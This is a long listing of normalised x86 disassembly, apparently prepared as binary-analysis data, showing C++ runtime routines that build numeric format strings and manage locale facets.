jpe r-xdata
fxch st1
fstp st0
cmp [ esp + 0x13 ] 0x0
fstp st1
je r-xdata
cmp ebx esi
jl r-xdata
push [ ebp + 0x10 ]
mov al 0x4c
push [ ebp + 0xc ]
lea esi [ esp + 0x28 ]
push ecx
push ecx
fstp [ esp ]
push [ esp + 0x30 ]
call sub_409df4
push eax
lea eax [ esp + 0x40 ]
push 0x6c
push eax
call sub_4235c7
add esp 0x18
push eax
push ebx
push [ esp + 0x28 ]
lea edx [ esp + 0x3c ]
push [ esp + 0x28 ]
mov ecx edi
push [ ebp + 0x18 ]
push [ esp + 0x38 ]
call sub_409e50
mov ecx [ esp + 0xbc ]
mov eax [ esp + 0x3c ]
add esp 0x20
pop edi
pop esi
pop ebx
xor ecx esp
call sub_4234de
mov esp ebp
pop ebp
retn 0x1c
fchs
jmp r-xdata
fld [ r--data ]
fcomp st1
fnstsw ax
test ah 0x1
jne r-xdata
cmp [ esp + 0x18 ] edx
jae r-xdata
sub ebx esi
fmul st1
add [ esp + 0x18 ] esi
jmp r-xdata
sub_409bc2
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x4c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x48 ] eax
mov eax [ ebp + 0x1c ]
push esi
push [ ebp + 0x10 ]
mov esi [ ebp + 0x8 ]
push [ ebp + 0xc ]
push eax
push r--data
lea eax [ esp + 0x18 ]
push 0x40
push eax
call sub_4235c7
mov ecx [ ebp + 0x14 ]
add esp 0x10
push eax
push [ ebp + 0x18 ]
lea edx [ esp + 0x18 ]
push esi
call sub_40a2f3
mov ecx [ esp + 0x60 ]
add esp 0x14
mov eax esi
pop esi
xor ecx esp
call sub_4234de
mov esp ebp
pop ebp
retn 0x18
sub_409c90
push 0x0
mov eax sub_43ea7d
call sub_425dad
xor ebx ebx
push ebx
push edi
xor ecx ecx
mov [ edi + 0x24 ] ebx
mov [ edi + 0x4 ] ebx
mov [ edi + 0xc ] ebx
mov [ edi + 0x10 ] 0x201
mov [ edi + 0x14 ] 0x6
mov [ edi + 0x18 ] ebx
mov [ edi + 0x1c ] ebx
mov [ edi + 0x20 ] ebx
call sub_406490
push 0x4
call sub_4246c6
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
xor eax eax
call sub_422eee
mov [ esi ] eax
call sub_422d1c
mov ecx eax
call sub_40614d
mov eax esi
jmp r-xdata
mov [ edi + 0x4 ] ebx
call sub_425e4c
retn 0x4
mov eax [ edi + 0x8 ]
or eax 0x4
push ebx
push edi
mov ecx eax
call sub_406490
mov [ edi + 0x24 ] eax
mov eax [ ebp + 0x8 ]
mov [ edi + 0x28 ] eax
lea esi [ ebp + 0x8 ]
mov eax edi
mov [ edi + 0x2c ] ebx
call sub_406595
push eax
mov [ ebp - 0x4 ] ebx
call sub_40a735
or [ ebp - 0x4 ] 0xffffffff
pop ecx
lea ecx [ ebp + 0x8 ]
mov esi eax
call sub_4061b7
mov eax [ esi ]
push 0x20
mov ecx esi
call [ eax + 0x18 ]
mov [ edi + 0x30 ] al
cmp [ edi + 0x28 ] ebx
jne r-xdata
sub_409d47
push 0x0
mov eax sub_43a732
call sub_425dad
mov esi [ ebp + 0x8 ]
lea ecx [ esi + 0x4 ]
mov [ esi ] r--data
call sub_42307d
xor edi edi
push 0x4
mov [ ebp - 0x4 ] edi
call sub_4246c6
mov ebx eax
pop ecx
cmp ebx edi
je r-xdata
xor eax eax
call sub_422eee
mov [ ebx ] eax
call sub_422d1c
mov ecx eax
call sub_40614d
mov eax ebx
jmp r-xdata
mov [ esi + 0x38 ] eax
lea ecx [ esi + 0x18 ]
mov [ esi + 0x20 ] ecx
lea ecx [ esi + 0x1c ]
mov [ esi + 0x24 ] ecx
lea eax [ esi + 0x8 ]
mov [ esi + 0x10 ] eax
lea ecx [ esi + 0x28 ]
mov [ esi + 0x30 ] ecx
lea eax [ esi + 0xc ]
mov [ esi + 0x14 ] eax
lea ecx [ esi + 0x2c ]
mov [ esi + 0x34 ] ecx
mov [ eax ] edi
mov eax [ esi + 0x24 ]
mov [ eax ] edi
mov eax [ esi + 0x34 ]
mov [ eax ] edi
mov eax [ esi + 0x10 ]
mov [ eax ] edi
mov eax [ esi + 0x20 ]
mov [ eax ] edi
mov eax [ esi + 0x30 ]
mov [ eax ] edi
mov eax esi
call sub_425e4c
retn 0x4
sub_409df4
push ebx
mov ebx ecx
mov [ esi ] 0x25
lea ecx [ esi + 0x1 ]
test bl 0x20
je r-xdata
test bl 0x10
je r-xdata
mov [ ecx ] 0x2b
inc ecx
mov [ ecx ] 0x2e
inc ecx
mov [ ecx ] 0x2a
inc ecx
test al al
je r-xdata
mov [ ecx ] 0x23
inc ecx
mov edx 0x3000
and ebx edx
cmp ebx 0x2000
jne r-xdata
mov [ ecx ] al
inc ecx
cmp ebx edx
jne r-xdata
mov dl 0x66
jmp r-xdata
cmp ebx 0x1000
setne dl
lea edx [ edx + edx + 0x65 ]
mov dl 0x61
jmp r-xdata
mov [ ecx ] dl
mov [ ecx + 0x1 ] 0x0
mov eax esi
pop ebx
retn
sub_409e50
push 0x6c
mov eax sub_43b369
call sub_425e16
mov edi ecx
mov ebx edx
lea esi [ ebp - 0x74 ]
mov eax edi
mov [ ebp - 0x60 ] edi
mov [ ebp - 0x50 ] ebx
call sub_406595
and [ ebp - 0x4 ] 0x0
push eax
call sub_40a871
or [ ebp - 0x4 ] 0xffffffff
pop ecx
mov esi eax
lea ecx [ ebp - 0x74 ]
mov [ ebp - 0x6c ] esi
call sub_4061b7
lea eax [ ebp - 0x4c ]
push eax
mov ecx esi
call sub_40a71e
mov [ ebp - 0x4 ] 0x1
mov eax [ esi ]
mov ecx esi
call [ eax + 0x8 ]
push 0x0
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x64 ] al
mov [ ebp - 0x18 ] 0xf
call sub_404490
mov [ ebp - 0x4 ] 0x2
mov al [ ebx ]
cmp al 0x2b
je r-xdata
mov [ ebp - 0x68 ] 0x1
cmp al 0x2d
je r-xdata
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
and [ ebp + 0x18 ] eax
and [ ebp - 0x68 ] 0x0
jmp r-xdata
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x48 ]
call sub_4248f7
mov eax [ eax ]
push [ ebp + 0x1c ]
mov al [ eax ]
push 0x65
push ebx
mov [ ebp - 0x54 ] al
mov [ ebp - 0x53 ] 0x65
mov [ ebp - 0x52 ] 0x0
call sub_423980
add esp 0xc
push [ ebp + 0x1c ]
mov esi eax
movsx eax [ ebp - 0x54 ]
push eax
push ebx
call sub_423980
add esp 0xc
mov [ ebp - 0x58 ] eax
test eax eax
jne r-xdata
mov ecx [ ebp + 0x14 ]
mov eax [ ebp + 0x10 ]
add eax ecx
add eax [ ebp + 0x18 ]
mov ecx [ edi + 0x18 ]
add eax [ ebp + 0x1c ]
test ecx ecx
jle r-xdata
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
and [ ebp - 0x50 ] 0x0
cmp ecx eax
jbe r-xdata
cmp [ eax ] 0x0
jle r-xdata
lea eax [ ebp - 0x48 ]
movsx eax [ ebp - 0x54 ]
push [ ebp + 0x1c ]
push eax
push ebx
call sub_423980
add esp 0xc
test eax eax
je r-xdata
cmp eax 0x100
jne r-xdata
sub ecx eax
mov [ ebp - 0x50 ] ecx
jmp r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x30 ]
push ebx
call sub_4042d7
test esi esi
jne r-xdata
push [ ebp + 0x1c ]
push 0x65
push ebx
call sub_423980
add esp 0xc
test eax eax
je r-xdata
push [ ebp + 0x24 ]
sub eax ebx
push [ ebp + 0x20 ]
inc eax
push [ ebp - 0x64 ]
mov edi eax
lea eax [ edi - 0x1 ]
push eax
lea eax [ ebp - 0x5c ]
push eax
mov eax ebx
call sub_40a696
mov ecx [ eax ]
add esp 0x14
push [ ebp + 0x10 ]
mov [ ebp + 0x20 ] ecx
mov ecx [ eax + 0x4 ]
mov [ ebp + 0x24 ] ecx
push 0x30
push [ eax + 0x4 ]
lea esi [ ebp - 0x5c ]
push [ eax ]
call sub_40a4c9
mov ecx [ eax ]
mov [ ebp + 0x20 ] ecx
mov eax [ eax + 0x4 ]
mov ecx [ ebp - 0x6c ]
mov [ ebp + 0x24 ] eax
mov eax [ ecx ]
add esp 0x10
call [ eax + 0x4 ]
push 0x1
mov [ ebp - 0x6c ] al
push [ ebp - 0x6c ]
lea esi [ ebp - 0x5c ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
call sub_40a4c9
mov ecx [ eax ]
push [ ebp + 0x14 ]
mov [ ebp + 0x20 ] ecx
mov ecx [ eax + 0x4 ]
mov [ ebp + 0x24 ] ecx
push 0x30
push [ eax + 0x4 ]
lea esi [ ebp - 0x70 ]
push [ eax ]
call sub_40a4c9
mov ecx [ eax ]
mov [ ebp + 0x20 ] ecx
mov eax [ eax + 0x4 ]
add ebx edi
add esp 0x20
sub [ ebp + 0x1c ] edi
mov edi [ ebp - 0x60 ]
mov [ ebp + 0x24 ] eax
push [ ebp - 0x50 ]
lea esi [ ebp - 0x5c ]
push [ ebp + 0xc ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
call sub_40a4c9
mov ecx [ eax ]
mov [ ebp + 0x20 ] ecx
mov eax [ eax + 0x4 ]
add esp 0x10
and [ ebp - 0x50 ] 0x0
mov [ ebp + 0x24 ] eax
cmp [ ebp - 0x68 ] 0x0
jbe r-xdata
mov eax [ edi + 0x10 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
cmp [ ebp - 0x58 ] 0x0
jne r-xdata
mov ebx [ ebp + 0x18 ]
push 0x30
lea edi [ ebp - 0x30 ]
call sub_403fc6
mov ebx [ ebp - 0x50 ]
jmp r-xdata
push [ ebp + 0x24 ]
lea eax [ ebp - 0x70 ]
push [ ebp + 0x20 ]
push [ ebp - 0x64 ]
push [ ebp + 0x1c ]
push eax
mov eax ebx
call sub_40a696
mov ecx [ eax ]
add esp 0x14
push [ ebp + 0x18 ]
mov [ ebp + 0x20 ] ecx
mov ecx [ eax + 0x4 ]
mov [ ebp + 0x24 ] ecx
push 0x30
push [ eax + 0x4 ]
lea esi [ ebp - 0x5c ]
push [ eax ]
call sub_40a4c9
mov ecx [ eax ]
push [ ebp - 0x50 ]
mov esi [ ebp + 0x8 ]
push [ ebp + 0xc ]
mov [ ebp + 0x20 ] ecx
mov eax [ eax + 0x4 ]
push eax
xor ebx ebx
push ecx
mov [ ebp + 0x24 ] eax
mov [ edi + 0x18 ] ebx
call sub_40a4c9
add esp 0x20
push ebx
push 0x1
lea ecx [ ebp - 0x30 ]
call sub_40415f
push ebx
push 0x1
lea ecx [ ebp - 0x4c ]
call sub_40415f
mov eax esi
call sub_425e60
retn
push [ ebp + 0x24 ]
sub eax ebx
push [ ebp + 0x20 ]
inc eax
push [ ebp - 0x64 ]
mov [ ebp - 0x6c ] eax
dec eax
push eax
lea eax [ ebp - 0x78 ]
push eax
mov eax ebx
call sub_40a696
mov ecx [ eax ]
add esp 0x14
push [ ebp + 0x18 ]
mov [ ebp + 0x20 ] ecx
mov ecx [ eax + 0x4 ]
mov [ ebp + 0x24 ] ecx
push 0x30
push [ eax + 0x4 ]
lea esi [ ebp - 0x78 ]
push [ eax ]
call sub_40a4c9
mov ecx [ eax ]
and [ ebp + 0x18 ] 0x0
mov [ ebp + 0x20 ] ecx
mov ecx [ eax + 0x4 ]
add esp 0x10
test [ edi + 0x10 ] 0x4
mov [ ebp + 0x24 ] ecx
mov ecx r--data
jne r-xdata
push 0x1
push [ ebp + 0x24 ]
mov eax ebx
push [ ebp + 0x20 ]
lea edi [ ebp - 0x5c ]
call sub_40a65d
mov ecx [ eax ]
mov edi [ ebp - 0x60 ]
add esp 0xc
mov [ ebp + 0x20 ] ecx
mov eax [ eax + 0x4 ]
inc ebx
dec [ ebp + 0x1c ]
mov [ ebp + 0x24 ] eax
push 0x30
push [ ebp + 0x18 ]
mov edi esi
sub edi ebx
lea esi [ ebp - 0x30 ]
call sub_40a5ca
mov ebx [ ebp + 0x10 ]
push 0x30
lea edi [ ebp - 0x30 ]
call sub_403fc6
and [ ebp + 0x10 ] 0x0
mov ebx [ ebp - 0x50 ]
mov eax [ ebp - 0x58 ]
push 0x30
test eax eax
jne r-xdata
push 0x1
push [ eax + 0x4 ]
lea edi [ ebp - 0x78 ]
push [ eax ]
mov eax ecx
call sub_40a65d
mov ecx [ eax ]
mov edi [ ebp - 0x60 ]
mov [ ebp + 0x20 ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x24 ] eax
mov eax [ ebp - 0x6c ]
add esp 0xc
add ebx eax
sub [ ebp + 0x1c ] eax
mov ecx r--data
push [ ebp + 0x14 ]
sub eax ebx
lea edi [ eax + 0x1 ]
lea esi [ ebp - 0x30 ]
mov [ ebp - 0x58 ] eax
call sub_40a5ca
mov edi [ ebp - 0x58 ]
push 0x30
push [ ebp + 0x10 ]
call sub_40a5ca
and [ ebp + 0x14 ] 0x0
mov ebx [ ebp + 0x10 ]
lea edi [ ebp - 0x30 ]
call sub_403fc6
jmp r-xdata
lea eax [ ebp - 0x54 ]
push eax
xor edi edi
lea eax [ ebp - 0x30 ]
call sub_403eaa
push eax
call sub_424930
pop ecx
pop ecx
mov edi eax
jmp r-xdata
lea ebx [ ebp - 0x48 ]
and [ ebp + 0x10 ] 0x0
cmp [ ebp - 0x34 ] 0x10
mov ebx [ ebp - 0x48 ]
jae r-xdata
mov al [ ebx ]
cmp al 0x7f
jne r-xdata
test al al
jle r-xdata
xor edi edi
lea eax [ ebp - 0x30 ]
call sub_403eaa
and [ ebp + 0x18 ] edi
mov edi [ ebp - 0x60 ]
mov [ ebp - 0x50 ] eax
mov eax [ ebp - 0x1c ]
mov ebx [ ebp - 0x50 ]
mov [ ebp + 0x1c ] eax
mov ecx edi
sub ecx [ ebp - 0x68 ]
movsx eax al
cmp eax ecx
jae r-xdata
push 0x0
sub edi eax
push 0x1
lea esi [ ebp - 0x30 ]
call sub_40a5ca
lea eax [ ebx + 0x1 ]
cmp [ eax ] 0x0
jle r-xdata
mov ebx eax
sub_40a28e
mov [ edi ] 0x25
lea ecx [ edi + 0x1 ]
test dl 0x20
je r-xdata
test dl 0x8
je r-xdata
mov [ ecx ] 0x2b
inc ecx
mov al [ ebx ]
cmp al 0x4c
je r-xdata
mov [ ecx ] 0x23
inc ecx
mov [ ecx ] 0x49
inc ecx
mov [ ecx ] 0x36
inc ecx
mov [ ecx ] 0x34
mov [ ecx ] al
jmp r-xdata
cmp esi 0x800
je r-xdata
mov dl 0x6f
jmp r-xdata
push esi
mov esi edx
and esi 0xe00
inc ecx
cmp esi 0x400
jne r-xdata
shl dl 0x3
not dl
and dl 0x20
or dl 0x58
mov dl [ ebx + 0x1 ]
jmp r-xdata
mov [ ecx ] dl
mov [ ecx + 0x1 ] 0x0
mov eax edi
pop esi
retn
sub_40a2f3
push 0x40
mov eax sub_43b32c
call sub_425e16
mov edi ecx
lea esi [ ebp - 0x38 ]
mov eax edi
mov [ ebp - 0x48 ] edi
mov ebx edx
call sub_406595
and [ ebp - 0x4 ] 0x0
push eax
call sub_40a871
or [ ebp - 0x4 ] 0xffffffff
pop ecx
mov ecx esi
mov [ ebp - 0x44 ] eax
call sub_4061b7
mov ecx [ ebp - 0x44 ]
lea eax [ ebp - 0x2c ]
push eax
call sub_40a71e
xor ecx ecx
inc ecx
mov [ ebp - 0x4 ] ecx
mov al [ ebx ]
cmp al 0x2b
je r-xdata
mov [ ebp - 0x30 ] ecx
cmp al 0x2d
je r-xdata
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x28 ]
cmp al 0x30
jne r-xdata
mov esi [ edi + 0x18 ]
test esi esi
jle r-xdata
cmp [ ebp - 0x14 ] 0x10
mov eax ecx
jae r-xdata
and [ ebp - 0x30 ] 0x0
jmp r-xdata
mov al [ ebx + 0x1 ]
cmp al 0x78
je r-xdata
xor esi esi
cmp esi [ ebp + 0x10 ]
jbe r-xdata
cmp [ eax ] 0x0
jle r-xdata
lea eax [ ebp - 0x28 ]
cmp [ ebp - 0x14 ] 0x10
mov ecx [ ebp - 0x28 ]
mov eax ecx
jae r-xdata
mov [ ebp - 0x30 ] 0x2
jmp r-xdata
cmp al 0x58
jne r-xdata
mov ecx [ ebp - 0x44 ]
mov eax [ ecx ]
call [ eax + 0x8 ]
push [ ebp + 0x18 ]
mov [ ebp - 0x38 ] al
push [ ebp + 0x14 ]
lea eax [ ebp - 0x34 ]
push [ ebp - 0x38 ]
push [ ebp + 0x10 ]
push eax
mov eax ebx
call sub_40a696
mov ecx [ eax ]
add esp 0x14
push esi
push [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov [ ebp + 0x14 ] ecx
mov eax [ eax + 0x4 ]
and [ edi + 0x18 ] 0x0
push eax
push ecx
mov [ ebp + 0x18 ] eax
call sub_40a4c9
add esp 0x10
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_40415f
mov eax esi
call sub_425e60
retn
cmp eax 0x100
je r-xdata
sub esi [ ebp + 0x10 ]
jmp r-xdata
cmp [ ebp - 0x14 ] 0x10
jb r-xdata
push [ ebp - 0x30 ]
mov eax ebx
push [ ebp + 0x18 ]
lea edi [ ebp - 0x40 ]
push [ ebp + 0x14 ]
call sub_40a65d
mov ecx [ eax ]
add esp 0xc
mov [ ebp + 0x14 ] ecx
mov ecx [ eax + 0x4 ]
push esi
push [ ebp + 0xc ]
mov [ ebp + 0x18 ] ecx
push [ eax + 0x4 ]
mov ecx [ ebp - 0x30 ]
push [ eax ]
sub [ ebp + 0x10 ] ecx
lea esi [ ebp - 0x34 ]
add ebx ecx
call sub_40a4c9
mov edi [ ebp - 0x48 ]
push esi
push [ ebp + 0xc ]
lea esi [ ebp - 0x4c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
call sub_40a4c9
jmp r-xdata
mov eax [ edi + 0x10 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
lea eax [ ebp - 0x28 ]
mov [ ebp - 0x3c ] eax
mov [ ebp - 0x3c ] ecx
jmp r-xdata
mov ecx [ eax ]
mov [ ebp + 0x14 ] ecx
mov eax [ eax + 0x4 ]
add esp 0x10
xor esi esi
mov [ ebp + 0x18 ] eax
mov eax [ ebp - 0x3c ]
mov al [ eax ]
cmp al 0x7f
jne r-xdata
mov esi [ ebp + 0x10 ]
jmp r-xdata
test al al
jle r-xdata
mov ecx esi
sub ecx [ ebp - 0x30 ]
movsx eax al
cmp eax ecx
jae r-xdata
sub esi eax
mov eax [ ebp + 0x10 ]
sub eax esi
inc eax
push eax
lea edi [ ebx + esi ]
push edi
push eax
lea eax [ ebx + esi + 0x1 ]
push eax
call sub_4234ed
mov eax [ ebp - 0x3c ]
add esp 0x10
inc [ ebp + 0x10 ]
inc eax
mov [ edi ] 0x0
cmp [ eax ] 0x0
jle r-xdata
mov edi [ ebp - 0x48 ]
mov [ ebp - 0x3c ] eax
sub_40a4c9
push ebp
mov ebp esp
cmp [ ebp + 0x14 ] 0x0
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov [ esi ] eax
mov eax [ ebp + 0xc ]
mov [ esi + 0x4 ] eax
mov eax esi
pop ebp
retn
mov ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
mov [ ebp + 0x8 ] 0x1
mov dl [ ebp + 0x10 ]
call sub_409384
cmp eax 0xffffffff
jne r-xdata
dec [ ebp + 0x14 ]
jne r-xdata
sub_40a52c
push esi
mov esi ecx
push [ esi + 0x8 ]
mov [ esi ] r--data
call sub_42491d
push [ esi + 0x10 ]
call sub_42491d
push [ esi + 0x14 ]
call sub_42491d
add esp 0xc
mov [ esi ] r--data
pop esi
retn
sub_40a5ca
push ebp
mov ebp esp
push ecx
cmp [ esi + 0x14 ] edi
jae r-xdata
or eax 0xffffffff
sub eax [ esi + 0x14 ]
cmp eax [ ebp + 0x8 ]
ja r-xdata
call sub_422b83
cmp [ ebp + 0x8 ] 0x0
jbe r-xdata
call sub_422b4b
mov eax esi
leave
retn 0x8
push ebx
mov ebx [ esi + 0x14 ]
add ebx [ ebp + 0x8 ]
push 0x0
push ebx
mov ecx esi
call sub_4044ac
test al al
je r-xdata
pop ebx
mov eax [ esi + 0x18 ]
lea ecx [ esi + 0x4 ]
cmp eax 0x10
jb r-xdata
mov [ ebp - 0x4 ] ecx
mov edx [ ecx ]
mov [ ebp - 0x4 ] edx
jmp r-xdata
mov edx [ esi + 0x14 ]
sub edx edi
push edx
mov edx [ ebp - 0x4 ]
sub eax edi
sub eax [ ebp + 0x8 ]
add edx edi
push edx
add ecx edi
add ecx [ ebp + 0x8 ]
push eax
push ecx
call sub_401049
mov dl [ ebp + 0xc ]
add esp 0x10
push [ ebp + 0x8 ]
mov ecx edi
mov eax esi
call sub_404452
push ebx
mov ecx esi
call sub_404490
mov ecx [ ecx ]
cmp eax 0x10
jb r-xdata
sub_40a65d
push ebp
mov ebp esp
push esi
mov esi eax
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
ja r-xdata
mov ecx [ ebp + 0xc ]
mov dl [ esi ]
test ecx ecx
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ edi ] eax
mov eax [ ebp + 0xc ]
mov [ edi + 0x4 ] eax
mov eax edi
pop esi
pop ebp
retn
mov [ ebp + 0x8 ] 0x1
call sub_409384
cmp eax 0xffffffff
jne r-xdata
dec [ ebp + 0x10 ]
inc esi
sub_40a696
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push edi
mov ebx eax
push esi
push [ ebp + 0x18 ]
mov eax ebx
push [ ebp + 0x14 ]
lea edi [ ebp - 0xc ]
call sub_40a65d
mov ecx [ eax ]
mov [ ebp + 0x14 ] ecx
mov ecx [ eax + 0x4 ]
add esp 0xc
add ebx esi
sub [ ebp + 0xc ] esi
mov [ ebp + 0x18 ] ecx
je r-xdata
sub eax ebx
mov esi eax
mov edx [ eax ]
mov ecx [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
pop edi
pop esi
mov [ ecx + 0x4 ] eax
mov [ ecx ] edx
mov eax ecx
pop ebx
leave
retn
cmp [ ebp + 0x10 ] 0x0
je r-xdata
inc ebx
dec [ ebp + 0xc ]
jmp r-xdata
push 0x1
push [ ebp + 0x10 ]
lea esi [ ebp - 0x14 ]
push [ eax + 0x4 ]
push [ eax ]
call sub_40a4c9
mov ecx [ eax ]
mov [ ebp + 0x14 ] ecx
mov eax [ eax + 0x4 ]
add esp 0x10
mov [ ebp + 0x18 ] eax
mov esi [ ebp + 0xc ]
push esi
push 0x0
push ebx
call sub_423980
add esp 0xc
test eax eax
je r-xdata
sub_40a735
push 0x14
mov eax sub_43c359
call sub_425dad
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_42303e
and [ ebp - 0x4 ] 0x0
mov edi [ rw-data ]
mov esi rw-data
mov [ ebp - 0x10 ] edi
call sub_40611c
mov esi eax
mov eax [ ebp + 0x8 ]
call sub_4061ec
mov esi eax
test esi esi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_423066
mov eax esi
call sub_425e4c
retn
test edi edi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_40621a
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov esi edi
jmp r-xdata
mov esi [ ebp - 0x10 ]
mov ecx esi
mov [ rw-data ] esi
call sub_40614d
push esi
call sub_422de1
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_4238f1
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_42597b
sub_40a7d3
push 0x14
mov eax sub_43c359
call sub_425dad
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_42303e
and [ ebp - 0x4 ] 0x0
mov edi [ rw-data ]
mov esi rw-data
mov [ ebp - 0x10 ] edi
call sub_40611c
mov esi eax
mov eax [ ebp + 0x8 ]
call sub_4061ec
mov esi eax
test esi esi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_423066
mov eax esi
call sub_425e4c
retn
test edi edi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_40a90d
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov esi edi
jmp r-xdata
mov esi [ ebp - 0x10 ]
mov ecx esi
mov [ rw-data ] esi
call sub_40614d
push esi
call sub_422de1
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_4238f1
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_42597b
sub_40a871
push 0x14
mov eax sub_43c359
call sub_425dad
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_42303e
and [ ebp - 0x4 ] 0x0
mov edi [ rw-data ]
mov esi rw-data
mov [ ebp - 0x10 ] edi
call sub_40611c
mov esi eax
mov eax [ ebp + 0x8 ]
call sub_4061ec
mov esi eax
test esi esi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_423066
mov eax esi
call sub_425e4c
retn
test edi edi
je r-xdata
push [ ebp + 0x8 ]
lea edi [ ebp - 0x10 ]
call sub_40a9c5
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov esi edi
jmp r-xdata
mov esi [ ebp - 0x10 ]
mov ecx esi
mov [ rw-data ] esi
call sub_40614d
push esi
call sub_422de1
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_4238f1
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_42597b
sub_40a90d
push 0x98
mov eax sub_43b2fe
call sub_425dad
mov eax [ ebp + 0x8 ]
xor edi edi
mov [ ebp - 0x10 ] edi
cmp eax edi
je r-xdata
push 0x4
pop eax
call sub_425e4c
retn
cmp [ eax ] edi
jne r-xdata
push 0x10
call sub_4246c6
mov esi eax
pop ecx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] edi
cmp esi edi
je r-xdata
xor esi esi
lea eax [ ebp - 0x30 ]
push eax
mov eax [ ebp + 0xc ]
call sub_4061cf
push eax
lea eax [ ebp - 0xa4 ]
mov [ ebp - 0x4 ] 0x1
push eax
mov [ ebp - 0x10 ] 0x1
call sub_40602d
mov [ ebp - 0x10 ] 0x3
mov [ esi + 0x4 ] edi
mov [ esi ] r--data
call sub_422bbb
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea eax [ ebp - 0xa4 ]
push eax
call sub_406082
mov ecx [ ebp + 0x8 ]
push 0x2
pop eax
mov [ ebp - 0x4 ] eax
mov [ ecx ] esi
test [ ebp - 0x10 ] al
je r-xdata
push edi
push 0x1
lea ecx [ ebp - 0x30 ]
call sub_40415f
sub_40a9c5
push 0x98
mov eax sub_43b2bd
call sub_425dad
xor ebx ebx
mov [ ebp - 0x10 ] ebx
cmp edi ebx
je r-xdata
push 0x4
pop eax
call sub_425e4c
retn
cmp [ edi ] ebx
jne r-xdata
push 0x18
call sub_4246c6
mov esi eax
pop ecx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] ebx
inc ebx
test esi esi
je r-xdata
xor esi esi
lea eax [ ebp - 0x30 ]
push eax
mov eax [ ebp + 0x8 ]
call sub_4061cf
push eax
lea eax [ ebp - 0xa4 ]
mov [ ebp - 0x4 ] bl
push eax
mov [ ebp - 0x10 ] ebx
call sub_40602d
and [ esi + 0x4 ] 0x0
push 0x3
pop eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] eax
push esi
mov [ esi ] r--data
call sub_40aa72
jmp r-xdata
test [ ebp - 0x10 ] bl
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea eax [ ebp - 0xa4 ]
push eax
call sub_406082
mov [ ebp - 0x4 ] 0x4
test [ ebp - 0x10 ] 0x2
mov [ edi ] esi
je r-xdata
push 0x0
push ebx
lea ecx [ ebp - 0x30 ]
call sub_40415f
sub_40aa72
push 0x4
mov eax sub_43a6ca
call sub_425de0
mov esi [ ebp + 0x8 ]
call sub_4248f7
mov edi eax
xor eax eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x10 ] eax
mov [ esi + 0x14 ] eax
mov [ ebp - 0x4 ] eax
call sub_422bbb
mov eax [ edi + 0x8 ]
call sub_40ab3b
mov [ esi + 0x8 ] eax
call sub_422bbb
mov eax r--data
call sub_40ab3b
mov [ esi + 0x10 ] eax
call sub_422bbb
mov eax r--data
call sub_40ab3b
or [ ebp - 0x4 ] 0xffffffff
mov [ esi + 0x14 ] eax
call sub_422bbb
mov eax [ edi ]
mov al [ eax ]
mov [ esi + 0xc ] al
call sub_422bbb
mov eax [ edi + 0x4 ]
mov al [ eax ]
mov [ esi + 0xd ] al
call sub_422bbb
mov eax r--data
call sub_40ab3b
mov [ esi + 0x8 ] eax
call sub_422bbb
mov [ esi + 0xc ] 0x2e
call sub_422bbb
mov [ esi + 0xd ] 0x2c
call sub_425e4c
retn 0x4
sub_40ab13
mov esi [ ebp + 0x8 ]
push [ esi + 0x8 ]
call sub_42491d
push [ esi + 0x10 ]
call sub_42491d
push [ esi + 0x14 ]
call sub_42491d
add esp 0xc
xor eax eax
push eax
push eax
call sub_42597b
int3
sub_40ab3b
push esi
push edi
mov edi eax
lea ecx [ eax + 0x1 ]
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax ecx
lea esi [ eax + 0x1 ]
push esi
call sub_4230c5
pop ecx
